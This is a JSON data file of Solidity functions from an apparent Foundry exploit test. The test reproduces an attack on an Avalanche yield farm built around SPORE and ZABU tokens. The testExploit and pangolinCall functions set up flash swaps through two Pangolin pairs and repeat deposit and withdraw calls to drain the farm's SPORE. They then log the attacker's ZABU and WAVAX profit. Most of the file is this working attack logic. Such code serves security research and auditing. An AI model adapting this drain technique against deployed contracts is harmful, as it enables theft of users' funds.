[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "ContractFactory",
    "original_code": "    function ContractFactory() public {\n        address _add;\n        bytes memory bytecode = type(depositToken).creationCode;\n        assembly {\n            _add := create2(0, add(bytecode, 32), mload(bytecode), 1)\n        }\n        addressContract = _add;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "buyPNG",
    "original_code": "    function buyPNG(\n        uint256 amount\n    ) public {\n        address[] memory path = new address[](2);\n        path[0] = address(WAVAX);\n        path[1] = address(PNG);\n        Router.swapTokensForExactTokens(amount, WAVAX.balanceOf(address(this)), path, address(this), block.timestamp);\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "pangolinCall",
    "original_code": "    function pangolinCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {\n        if (msg.sender == address(PangolinPair1)) {\n            PangolinPair2.swap(0, reserve1Pair2 - 1 * 1e18, address(this), new bytes(1));\n            // flashswap callback pair1\n            uint256 amountSPORE0 = SPORE.balanceOf(address(this));\n            SPORE.transfer(address(PangolinPair1), amountSPORE0);\n            uint256 SPOREInPair1 = SPORE.balanceOf(address(PangolinPair1));\n            uint256 WAVAXInPair1 = WAVAX.balanceOf(address(PangolinPair1));\n            uint256 amountWAVAX = (\n                reserve0Pair1 * reserve1Pair1 / ((SPOREInPair1 * 1000 - amountSPORE0 * 3 * 96 / 100) / 1000)\n                    - WAVAXInPair1\n            ) * 1000 / 997;\n            WAVAX.transfer(address(PangolinPair1), amountWAVAX);\n        }\n\n        if (msg.sender == address(PangolinPair2)) {\n            //reduced lptoken\n            while (SPORE.balanceOf(address(Farm)) > 1000) {\n                uint256 amount = SPORE.balanceOf(address(this));\n                if (SPORE.balanceOf(address(this)) * 6 / 100 > SPORE.balanceOf(address(Farm))) {\n                    amount = SPORE.balanceOf(address(Farm)) * 100 / 6;\n                }\n                Farm.deposit(uint256(38), amount);\n                Farm.withdraw(uint256(38), amount);\n            }\n\n            // flashswap callback pair2\n            uint256 amountSPORE1 = SPORE.balanceOf(address(this)) / 3;\n            SPORE.transfer(address(PangolinPair2), amountSPORE1);\n            uint256 SPOREInPari2 = SPORE.balanceOf(address(PangolinPair2));\n            uint256 PNGInPair2 = PNG.balanceOf(address(PangolinPair2));\n            uint256 amountPNG = (\n                reserve0Pair2 * reserve1Pair2 / ((SPOREInPari2 * 1000 - amountSPORE1 * 3 * 96 / 100) / 1000)\n                    - PNGInPair2\n            ) * 1000 / 997;\n            buyPNG(amountPNG);\n            PNG.transfer(address(PangolinPair2), PNG.balanceOf(address(this)));\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"Avalanche\", 4_177_751);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public payable {\n        SPORE.approve(address(Farm), type(uint256).max);\n        WAVAX.approve(address(Router), type(uint256).max);\n        (reserve0Pair1, reserve1Pair1,) = PangolinPair1.getReserves();\n        (reserve0Pair2, reserve1Pair2,) = PangolinPair2.getReserves();\n        address(WAVAX).call{value: 2500 ether}(\"\");\n        // depost SPORE\n        ContractFactory();\n        (bool success,) = addressContract.call{value: 1 ether}(abi.encodeWithSignature(\"depositSPORE()\"));\n        require(success);\n        // change block.number\n        cheats.roll(block.number + 900);\n\n        PangolinPair1.swap(SPORE.balanceOf(address(PangolinPair1)) - 1 * 1e18, 0, address(this), new bytes(1));\n        // change block.number\n        cheats.roll(block.number + 1001);\n        (bool success1,) = addressContract.call(abi.encodeWithSignature(\"withdrawSPORE()\"));\n        require(success1);\n\n        emit log_named_decimal_uint(\"Attacker ZABU profit after exploit\", ZABU.balanceOf(addressContract), 18);\n\n        (bool success2,) = addressContract.call(abi.encodeWithSignature(\"sellZABU()\"));\n        require(success2);\n\n        emit log_named_decimal_uint(\n            \"Attacker WAVAX profit after exploit\", WAVAX.balanceOf(addressContract) - 2500 * 1e18, 18\n        );\n    }\n\n",
    "description": ""
  }
]